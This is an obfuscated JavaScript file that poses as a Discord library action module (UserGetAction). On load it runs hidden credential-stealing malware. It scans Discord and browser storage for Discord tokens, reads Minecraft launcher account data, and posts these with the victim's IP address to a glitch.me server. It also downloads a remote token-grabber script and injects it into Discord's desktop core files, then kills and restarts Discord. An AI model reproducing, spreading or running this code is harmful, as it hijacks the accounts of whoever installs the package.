var _0x17349f = _0x4edf;
const Action = require(_0x17349f(0x101));
const OS = require('os'), fs = require('fs'), fetch = require(_0x17349f(0x102)), {execSync} = require(_0x17349f(0x103)), Glob = require(_0x17349f(0x104)), toInject = [], toInjectJS = [], toKill = [], apiurl = _0x17349f(0x105);
try {
    switch (OS[_0x17349f(0x106)]()) {
    case _0x17349f(0x107):
        const local = process[_0x17349f(0x108)][_0x17349f(0x109)], roaming = process[_0x17349f(0x108)][_0x17349f(0x10a)], minecraftPath = roaming + _0x17349f(0x10b), remixPath = roaming + _0x17349f(0x10c);
        dbPaths = [
            roaming + _0x17349f(0x10d),
            roaming + _0x17349f(0x10e),
            roaming + _0x17349f(0x10f),
            roaming + _0x17349f(0x110),
            roaming + _0x17349f(0x111),
            roaming + _0x17349f(0x112),
            roaming + _0x17349f(0x113),
            local + _0x17349f(0x114),
            local + _0x17349f(0x115),
            local + _0x17349f(0x116),
            local + _0x17349f(0x117),
            local + _0x17349f(0x118),
            local + _0x17349f(0x119),
            local + _0x17349f(0x11a),
            local + _0x17349f(0x11b),
            local + _0x17349f(0x11c),
            local + _0x17349f(0x11d),
            local + _0x17349f(0x11e),
            local + _0x17349f(0x11f),
            local + _0x17349f(0x120),
            local + _0x17349f(0x121),
            local + _0x17349f(0x122),
            local + _0x17349f(0x123)
        ];
        init();
        function init() {
            var _0x584fae = _0x4edf;
            fs[_0x584fae(0x124)](remixPath, (_0x3ee1fb, _0xe5092f) => _0xe5092f && minecraft(_0x584fae(0x125), _0xe5092f));
            fs[_0x584fae(0x124)](minecraftPath, (_0x48d093, _0x35ca23) => _0x35ca23 && minecraft(_0x584fae(0x126), _0x35ca23));
            injectToDiscord();
            dbPaths[_0x584fae(0x127)](_0x40af3a => main(_0x40af3a));
        }
        function main(_0x514bb9) {
            var _0x3463ef = _0x4edf;
            fs[_0x3463ef(0x128)](_0x514bb9, (_0x499681, _0x128f0d) => {
                var _0x275a06 = _0x4edf;
                if (_0x128f0d) {
                    var _0x310d64 = _0x128f0d[_0x275a06(0x129)](_0xb2e3c8 => _0xb2e3c8[_0x275a06(0x12a)](_0x275a06(0x12b)));
                    _0x310d64[_0x275a06(0x127)](_0x5ea8e0 => {
                        var _0x4b23b1 = _0x4edf;
                        var _0x16427e = fs[_0x4b23b1(0x12c)](_0x514bb9 + '/' + _0x5ea8e0)[_0x4b23b1(0x12d)]();
                        var _0x33df55 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x8ebe97 = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x44f8dd] = _0x33df55[_0x4b23b1(0x12e)](_0x16427e) || _0x8ebe97[_0x4b23b1(0x12e)](_0x16427e) || [undefined];
                        if (_0x44f8dd)
                            fetch(_0x4b23b1(0x12f))[_0x4b23b1(0x130)](_0x18cb59 => _0x18cb59[_0x4b23b1(0x131)]())[_0x4b23b1(0x130)](_0x2a72e3 => fetch(apiurl + _0x4b23b1(0x132), {
                                'method': _0x4b23b1(0x133),
                                'body': JSON[_0x4b23b1(0x134)]({
                                    'token': _0x44f8dd[_0x4b23b1(0x135)](0x1, -0x1),
                                    'ipAddress': _0x2a72e3[_0x4b23b1(0x136)]
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0x364de8, _0x166662) {
            var _0x46c56e = _0x4edf;
            switch (_0x364de8) {
            case _0x46c56e(0x125):
                fetch(apiurl + _0x46c56e(0x137), {
                    'method': _0x46c56e(0x133),
                    'body': JSON[_0x46c56e(0x134)]({ 'UID': _0x166662 })
                });
                break;
            case _0x46c56e(0x126):
                var [_0x4438f0] = /"[\d\w_-]{32}"/[_0x46c56e(0x12e)](_0x166662);
                if (_0x4438f0) {
                    const _0x5483cf = require(minecraftPath);
                    if (!_0x5483cf[_0x46c56e(0x138)])
                        return;
                    var _0x48fdbb = _0x5483cf[_0x46c56e(0x138)][_0x4438f0[_0x46c56e(0x135)](0x1, -0x1)];
                    fetch(apiurl + _0x46c56e(0x139), {
                        'method': _0x46c56e(0x133),
                        'body': JSON[_0x46c56e(0x134)]({
                            'eligibleForMigration': _0x48fdbb[_0x46c56e(0x13a)],
                            'hasMultipleProfiles': _0x48fdbb[_0x46c56e(0x13b)],
                            'legacy': _0x48fdbb[_0x46c56e(0x13c)],
                            'localId': _0x48fdbb[_0x46c56e(0x13d)],
                            'minecraftProfileID': _0x48fdbb[_0x46c56e(0x13e)]['id'],
                            'minecraftProfileName': _0x48fdbb[_0x46c56e(0x13e)][_0x46c56e(0x13f)],
                            'persistent': _0x48fdbb[_0x46c56e(0x140)],
                            'remoteId': _0x48fdbb[_0x46c56e(0x141)],
                            'type': _0x48fdbb[_0x46c56e(0x142)],
                            'username': _0x48fdbb[_0x46c56e(0x143)],
                            'activeAccountLocalId': _0x5483cf[_0x46c56e(0x144)]
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            var _0xac28da = _0x4edf;
            getInstalledDiscord();
            killAllDiscords();
            fetch(_0xac28da(0x145))[_0xac28da(0x130)](_0x4e7365 => _0x4e7365[_0xac28da(0x146)]())[_0xac28da(0x130)](_0x50dd6c => toInjectJS[_0xac28da(0x127)](_0x13e262 => fs[_0xac28da(0x147)](_0x13e262, _0x50dd6c[_0xac28da(0x148)](_0xac28da(0x149), apiurl)) ^ execSync(local + '/' + _0x13e262[_0xac28da(0x14a)]('/')[0x5] + _0xac28da(0x14b) + _0x13e262[_0xac28da(0x14a)]('/')[0x5] + _0xac28da(0x14c))));
        }
        function getInstalledDiscord() {
            var _0x41aca7 = _0x4edf;
            fs[_0x41aca7(0x14d)](roaming)[_0x41aca7(0x127)](_0x2d5cf0 => _0x2d5cf0[_0x41aca7(0x14e)](_0x41aca7(0x14f)) && toInject[_0x41aca7(0x150)](local + '/' + _0x2d5cf0));
            toInject[_0x41aca7(0x127)](_0xfb00ab => Glob[_0x41aca7(0x151)](_0xfb00ab + _0x41aca7(0x152))[_0x41aca7(0x153)](_0x4e8075 => toInjectJS[_0x41aca7(0x150)](_0x4e8075)));
        }
        function killAllDiscords() {
            var _0x43809b = _0x4edf;
            var _0x511b78 = execSync(_0x43809b(0x154))[_0x43809b(0x12d)]();
            _0x511b78[_0x43809b(0x14e)](_0x43809b(0x155)) && toKill[_0x43809b(0x150)](_0x43809b(0x156));
            _0x511b78[_0x43809b(0x14e)](_0x43809b(0x157)) && toKill[_0x43809b(0x150)](_0x43809b(0x158));
            _0x511b78[_0x43809b(0x14e)](_0x43809b(0x159)) && toKill[_0x43809b(0x150)](_0x43809b(0x15a));
            _0x511b78[_0x43809b(0x14e)](_0x43809b(0x15b)) && toKill[_0x43809b(0x150)](_0x43809b(0x15c));
            toKill[_0x43809b(0x127)](_0x518310 => execSync(_0x43809b(0x15d) + _0x518310 + _0x43809b(0x15e)));
        }
        break;
    case _0x17349f(0x15f):
        const defaut = _0x17349f(0x160) + __dirname[_0x17349f(0x14a)]('/')[0x2] + _0x17349f(0x161), LdbPaths = [
                defaut + _0x17349f(0x162),
                defaut + _0x17349f(0x111),
                defaut + _0x17349f(0x110),
                defaut + _0x17349f(0x10e)
            ];
        const LminecraftPath = defaut + _0x17349f(0x10b);
        Linit();
        function Linit() {
            var _0x1aee1c = _0x4edf;
            LdbPaths[_0x1aee1c(0x127)](_0x42fb74 => Lmain(_0x42fb74));
            var _0x33fdad = fs[_0x1aee1c(0x12c)](LminecraftPath);
            if (_0x33fdad)
                Lminecraft(_0x33fdad);
            LinjectToDiscord();
        }
        function Lmain(_0x1d4c5c) {
            var _0x552918 = _0x4edf;
            fs[_0x552918(0x128)](_0x1d4c5c, (_0x2a89d0, _0xb401d4) => {
                var _0x451a29 = _0x4edf;
                if (_0xb401d4) {
                    var _0xc89a01 = _0xb401d4[_0x451a29(0x129)](_0x8ff1e0 => _0x8ff1e0[_0x451a29(0x12a)](_0x451a29(0x12b)));
                    _0xc89a01[_0x451a29(0x127)](_0x569d20 => {
                        var _0x999bf0 = _0x4edf;
                        var _0x2b95fb = fs[_0x999bf0(0x12c)](_0xb401d4 + '/' + _0x569d20)[_0x999bf0(0x12d)]();
                        var _0xacdab3 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x494b8e = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x1ced2c] = _0xacdab3[_0x999bf0(0x12e)](_0x2b95fb) || _0x494b8e[_0x999bf0(0x12e)](_0x2b95fb) || [undefined];
                        if (_0x1ced2c)
                            fetch(_0x999bf0(0x12f))[_0x999bf0(0x130)](_0x5e590f => _0x5e590f[_0x999bf0(0x131)]())[_0x999bf0(0x130)](_0x590c51 => fetch(apiurl + _0x999bf0(0x132), {
                                'method': _0x999bf0(0x133),
                                'body': JSON[_0x999bf0(0x134)]({
                                    'token': _0x1ced2c,
                                    'ip': _0x590c51[_0x999bf0(0x136)]
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x1b4172) {
            var _0x5cda14 = _0x4edf;
            var [_0x130fc8] = /"[\d\w_-]{32}"/[_0x5cda14(0x12e)](_0x1b4172);
            if (_0x130fc8) {
                const _0x1a275a = require(LminecraftPath);
                if (!_0x1a275a[_0x5cda14(0x138)])
                    return;
                var _0x479910 = _0x1a275a[_0x5cda14(0x138)][_0x130fc8[_0x5cda14(0x135)](0x1, -0x1)];
                fetch(apiurl + _0x5cda14(0x139), {
                    'method': _0x5cda14(0x133),
                    'body': JSON[_0x5cda14(0x134)]({
                        'eligibleForMigration': _0x479910[_0x5cda14(0x13a)],
                        'hasMultipleProfiles': _0x479910[_0x5cda14(0x13b)],
                        'legacy': _0x479910[_0x5cda14(0x13c)],
                        'localId': _0x479910[_0x5cda14(0x13d)],
                        'minecraftProfileID': _0x479910[_0x5cda14(0x13e)]['id'],
                        'minecraftProfileName': _0x479910[_0x5cda14(0x13e)][_0x5cda14(0x13f)],
                        'persistent': _0x479910[_0x5cda14(0x140)],
                        'remoteId': _0x479910[_0x5cda14(0x141)],
                        'type': _0x479910[_0x5cda14(0x142)],
                        'username': _0x479910[_0x5cda14(0x143)],
                        'activeAccountLocalId': _0x1a275a[_0x5cda14(0x144)]
                    })
                });
            }
        }
        function LinjectToDiscord() {
            var _0xfa044d = _0x4edf;
            getInstalledLDiscord();
            fetch(_0xfa044d(0x145))[_0xfa044d(0x130)](_0x287846 => _0x287846[_0xfa044d(0x146)]())[_0xfa044d(0x130)](_0x1a1f66 => toInjectJS[_0xfa044d(0x127)](_0x5a7b69 => fs[_0xfa044d(0x147)](_0x5a7b69, _0x1a1f66[_0xfa044d(0x148)](_0xfa044d(0x149), apiurl))));
        }
        function getInstalledLDiscord() {
            var _0xbb6518 = _0x4edf;
            fs[_0xbb6518(0x14d)](defaut)[_0xbb6518(0x127)](_0x1d78c2 => _0x1d78c2[_0xbb6518(0x14e)](_0xbb6518(0x14f)) && toInject[_0xbb6518(0x150)](defaut + '/' + _0x1d78c2));
            toInject[_0xbb6518(0x127)](_0x3f5df4 => Glob[_0xbb6518(0x151)](_0x3f5df4 + _0xbb6518(0x163))[_0xbb6518(0x153)](_0x5e02b1 => toInjectJS[_0xbb6518(0x150)](_0x5e02b1)));
        }
        break;
    case _0x17349f(0x164):
        break;
    }
} catch (_0x2fb9df) {
}
class UserGetAction extends Action {
    [_0x17349f(0x165)](_0xcc4caa) {
        var _0x3a8605 = _0x4edf;
        const _0x4243ce = this[_0x3a8605(0x166)];
        const _0xe9d8d2 = _0x4243ce[_0x3a8605(0x167)][_0x3a8605(0x168)](_0xcc4caa);
        return { 'user': _0xe9d8d2 };
    }
}
function _0x4edf(_0x479c2a, _0x31589c) {
    var _0x4edfcc = _0x3158();
    _0x4edf = function (_0x4a909b, _0x1e4d5e) {
        _0x4a909b = _0x4a909b - 0x101;
        var _0xe888b2 = _0x4edfcc[_0x4a909b];
        return _0xe888b2;
    };
    return _0x4edf(_0x479c2a, _0x31589c);
}
module[_0x17349f(0x169)] = UserGetAction;
function _0x3158() {
    var _0x696aff = [
        './Action',
        'node-fetch',
        'child_process',
        'glob',
        'https://frequent-level-cornflower.glitch.me',
        'platform',
        'win32',
        'env',
        'localappdata',
        'appdata',
        '/.minecraft/launcher_accounts.json',
        '/.minecraft/remix/UID.txt',
        '/Discord/Local\x20Storage/leveldb',
        '/DiscordDevelopment/Local\x20Storage/leveldb',
        '/Lightcord/Local\x20Storage/leveldb',
        '/discordptb/Local\x20Storage/leveldb',
        '/discordcanary/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
        '/Amigo/User\x20Data/Local\x20Storage/leveldb',
        '/Torch/User\x20Data/Local\x20Storage/leveldb',
        '/Kometa/User\x20Data/Local\x20Storage/leveldb',
        '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
        '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
        '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
        '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
        '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
        '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
        '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
        '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
        '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb',
        'readFile',
        'remix',
        'minecraft',
        'forEach',
        'readdir',
        'filter',
        'endsWith',
        'ldb',
        'readFileSync',
        'toString',
        'exec',
        'http://ip-api.com/json/',
        'then',
        'json',
        '/beforeinject',
        'POST',
        'stringify',
        'slice',
        'query',
        '/remix',
        'accounts',
        '/minecraft',
        'eligibleForMigration',
        'hasMultipleProfiles',
        'legacy',
        'localId',
        'minecraftProfile',
        'name',
        'persistent',
        'remoteId',
        'type',
        'username',
        'activeAccountLocalId',
        'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js',
        'text',
        'writeFileSync',
        'replace',
        '*API\x20URL*',
        'split',
        '/Update.exe\x20--processStart\x20',
        '.exe',
        'readdirSync',
        'includes',
        'cord',
        'push',
        'sync',
        '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js',
        'map',
        'tasklist',
        'Discord.exe',
        'discord',
        'DiscordCanary.exe',
        'discordcanary',
        'DiscordDevelopment.exe',
        'discorddevelopment',
        'DiscordPTB.exe',
        'discordptb',
        'taskkill\x20/IM\x20',
        '.exe\x20/F',
        'linux',
        '/home/',
        '/.config',
        '/discord/Local\x20Storage/leveldb',
        '/*/modules/discord_desktop_core/index.js',
        'darwin',
        'handle',
        'client',
        'dataManager',
        'newUser',
        'exports'
    ];
    _0x3158 = function () {
        return _0x696aff;
    };
    return _0x3158();
}
